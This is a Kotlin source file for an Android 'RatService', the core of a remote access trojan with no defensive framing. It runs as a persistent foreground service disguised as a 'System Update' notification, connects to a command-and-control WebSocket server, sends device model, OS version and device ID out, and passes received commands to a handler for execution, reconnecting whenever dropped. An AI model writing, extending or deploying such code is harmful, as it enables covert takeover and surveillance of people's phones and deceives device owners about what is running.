package com.fox.rat

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.net.URI

class RatService : Service() {
    private var webSocketClient: WebSocketClient? = null
    private val channelId = "rat_service_channel"
    private val notificationId = 1
    private val serverUri = URI("wss://your-c2-server.com/ws")
    private val commandHandler = CommandHandler(this)

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(notificationId, buildNotification())
        connectWebSocket()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Running background processes"
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Update")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    private fun connectWebSocket() {
        webSocketClient = object : WebSocketClient(serverUri) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                Log.d("RAT", "Connected to C2")
                sendDeviceInfo()
            }

            override fun onMessage(message: String?) {
                message?.let { commandHandler.handle(it) }
            }

            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                Log.d("RAT", "Disconnected: $reason")
                // Reconnect logic
                reconnect()
            }

            override fun onError(ex: Exception?) {
                Log.e("RAT", "Error: ${ex?.message}")
                reconnect()
            }
        }
        webSocketClient?.connect()
    }

    private fun sendDeviceInfo() {
        val info = mapOf(
            "type" to "device_info",
            "model" to Build.MODEL,
            "manufacturer" to Build.MANUFACTURER,
            "version" to Build.VERSION.RELEASE,
            "sdk" to Build.VERSION.SDK_INT,
            "id" to Utils.getDeviceId(this)
        )
        webSocketClient?.send(Utils.toJson(info))
    }

    private fun reconnect() {
        android.os.Handler(mainLooper).postDelayed({
            connectWebSocket()
        }, 5000)
    }

    fun sendResponse(data: Map<String, Any>) {
        webSocketClient?.send(Utils.toJson(data))
    }

    override fun onDestroy() {
        webSocketClient?.close()
        super.onDestroy()
    }
}
